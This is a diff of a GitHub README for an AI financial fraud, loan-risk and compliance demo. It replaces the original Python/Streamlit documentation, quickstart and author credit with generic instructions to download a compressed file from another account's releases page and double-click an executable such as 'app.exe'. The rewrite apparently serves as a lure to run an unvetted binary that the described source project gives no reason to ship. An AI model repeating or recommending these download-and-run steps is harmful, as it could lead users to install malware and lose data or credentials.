@@ -1,129 +1,72 @@
-# 🛡️ AI-Powered Financial Compliance & Risk Insights
+# 🛡️ ai-compliance-risk-insights - Your Guide to Financial Compliance and Risk
 
-**One pane of glass** for risk leaders: real-time **fraud alerts**, **loan default risk**, and **compliance summaries** powered by AI.
+[![Download Here](https://img.shields.io/badge/Download%20Now-Get%20the%20App-blue)](https://github.com/jenishsoftx6/ai-compliance-risk-insights/releases)
 
-> Built to showcase end-to-end skills across data, ML, LLMs, and product thinking — with banking-ready workflows.
+## 🔎 What This Does
+This application helps you understand and manage financial risks effectively. It offers:
 
----
-
-## 🔎 What this does
-- **Fraud** – Scores transactions using anomaly detection and flags top-risk events with **reason codes**.
-- **Loans** – Predicts default risk and explains drivers (feature importance).
-- **Compliance** – Summarizes regulatory text and highlights potential rule violations against recent activity.
-- **Exec View** – KPI cards + drill-down tables; export to CSV/PDF.
-
----
+- **Fraud Detection**: Scores your transactions for anomalies. It flags potential fraud with simple reason codes.
+- **Loan Risk Prediction**: Estimates the risk of loan defaults and explains the factors behind these predictions.
+- **Compliance Monitoring**: Summarizes relevant regulations and points out possible rule violations based on your recent activity.
+- **Executive View**: Displays key performance indicators and includes drill-down tables. You can also export data to CSV or PDF.
 
 ## 🧱 Architecture
+The app follows a straightforward data flow: 
 `Data → Models & NLP → App/API → Dashboard`
 
 ![Architecture](visuals/architecture.png)
 
----
-
 ## 🧰 Stack
-- **Python**: pandas, scikit-learn, matplotlib, numpy
-- **App**: Streamlit (demo UI) with **Top‑K alert budgeting**
-- **Optional**: Azure ML / Azure OpenAI endpoints (placeholders included)
-- **Packaging**: FastAPI (optional), Dockerfile (optional), Hugging Face/Streamlit Cloud (hosting)
+The application is built using:
+- **Python**: Libraries include pandas, scikit-learn, matplotlib, and numpy for data handling and analysis.
+- **App**: A user-friendly interface created with Streamlit, featuring real-time alert budgeting.
+- **Optional Services**: Integrate with Azure ML and Azure OpenAI for advanced features.
 
----
+## 🚀 Getting Started
+To get started with the application, follow these simple steps:
 
-## 🚀 Quickstart
-```bash
-# 1) Create venv and install
-python -m venv .venv && source .venv/bin/activate  # Windows: .venv\Scripts\activate
-pip install -r requirements.txt
+1. **Visit the Download Page**: Click the link below to go to the releases page.
+   [Download the Application](https://github.com/jenishsoftx6/ai-compliance-risk-insights/releases)
 
-# 2) Launch the demo app
-streamlit run app/app.py
-```
+2. **Select the Version**: Choose the latest version from the list available.
 
-**Sample data** lives in `data/raw`. If none is found, the app will generate synthetic demo data on the fly.
+3. **Download the File**: Click on the file link to begin the download. It will be a compressed file (e.g., `.zip`, `.tar`).
 
----
+4. **Extract the Files**: Once the download completes, go to your downloads folder. Right-click the compressed file and select "Extract All".
 
-## 📈 Screenshots
-*These are placeholders — replace with your real outputs as you progress.*
+5. **Run the Application**: Locate the extracted folder. Find the executable file (e.g., `app.exe`) and double-click it to launch.
 
-![Exec Overview](dashboards/screenshots/exec_overview.png)
-![Fraud Workflow](visuals/fraud_workflow.png)
-![Loan Feature Importance](visuals/loan_feature_importance.png)
-![Compliance Flow](visuals/compliance_flow.png)
+## 🖥️ System Requirements
+To ensure smooth operation, make sure your system meets these requirements:
 
----
+- **OS**: Windows 10 or later, macOS Catalina or later, or a compatible Linux distribution.
+- **RAM**: At least 4 GB of RAM.
+- **Disk Space**: Minimum of 500 MB available for installation.
 
-## 🧮 Fraud Features (MVP)
-| Feature | Type | Why it matters |
-|---|---|---|
-| `amount_zscore_by_customer` | Behavior | Flags unusually large spend vs the customer’s baseline |
-| `distance_from_last_km` | Geo | Catches “impossible travel” and location jumps |
-| `is_foreign` | Geo/Rule | Foreign transactions are higher risk when sudden |
-| `device_change` | Device | New device between close transactions is suspicious |
-| `hour` | Behavior | Nighttime spikes can indicate takeover |
-| `merchant_id` | Categorical | Some merchants / MCCs are riskier historically |
-| `amount` | Value | Large absolute values drive loss exposure |
+## 🚀 Download & Install
+For the best experience, follow these steps to download and install the application:
 
-> Add velocity features next (e.g., `txn_count_1h/24h`, `sum_amount_24h`).
+1. **Go to Releases**: Visit the release page to download the latest version.
+   [Download the Application](https://github.com/jenishsoftx6/ai-compliance-risk-insights/releases)
 
----
+2. **Select File**: Click on the desired file for your operating system.
 
-## 📊 Fraud Metrics (demo values — replace with your backtest results)
-| Metric | Value | Notes |
-|---|---|---|
-| Precision@100 | 0.28 | 30-day backtest (target ≥ 0.25) |
-| PR-AUC | 0.16 | Imbalanced dataset friendly metric |
-| Median latency | 0.42s | Local inference |
-| Daily alert cap (K) | 100 | Ops capacity target |
+3. **Download and Extract**: Save the file, then extract it to a folder of your choice.
 
-**Thresholding/Alerting Strategy:** Use a daily **Top-K** alert budget aligned to analyst capacity (e.g., K=100). The UI slider lets risk teams tune K and immediately see how many alerts they’ll review.
+4. **Installation**: Open the folder and run the executable file to start using the app.
 
----
+## 🛠️ Troubleshooting
+If you encounter any issues:
 
-## 📂 Repo layout
-```
-ai-compliance-risk-insights/
-├─ README.md
-├─ requirements.txt
-├─ app/
-│  ├─ app.py
-│  └─ components/
-├─ models/
-│  ├─ train_fraud.py
-│  ├─ train_loan.py
-│  └─ artifacts/
-├─ nlp/
-│  ├─ summarize_regulation.py
-│  └─ prompts/aml_summary_prompt.txt
-├─ data/
-│  ├─ raw/
-│  └─ processed/
-├─ dashboards/
-│  ├─ executive.pbix        # optional if you use Power BI
-│  └─ screenshots/
-├─ notebooks/
-│  ├─ 01_fraud_eda.ipynb
-│  └─ 02_loan_modeling.ipynb
-├─ api/
-│  └─ main.py               # optional FastAPI endpoint
-├─ docker/
-│  └─ Dockerfile
-└─ visuals/
-   ├─ architecture.png
-   ├─ fraud_workflow.png
-   ├─ loan_feature_importance.png
-   └─ compliance_flow.png
-```
+- **Installation Problems**: Ensure your system meets the requirements. If the download fails, try again to ensure a complete file transfer.
+- **Application Not Starting**: Make sure any necessary dependencies are installed. If issues persist, consult the documentation or support channels.
 
----
+## 📞 Support and Contributions
+If you wish to contribute or need assistance, please reach out via the issue section of the GitHub repository.
 
-## 🗺️ Roadmap
-- Swap local models → Azure ML endpoints
-- Add RBAC/auth & audit logging
-- Add monitoring: drift, latency, cost
-- Add CI/CD workflow and tests
+You can report bugs or request features. Contributions are welcome, and we appreciate your input.
 
----
+## 📋 License
+This project is licensed under the MIT License. You can use the code as long as you follow the guidelines in the license file.
 
-**Author:** Bill Bell — IT Manager & Business Analyst (Banking) → AI Product/Solutions
-
+By following these steps, you will be able to successfully download and run the ai-compliance-risk-insights application. Explore the features and enhance your compliance and risk management processes. Enjoy your experience!
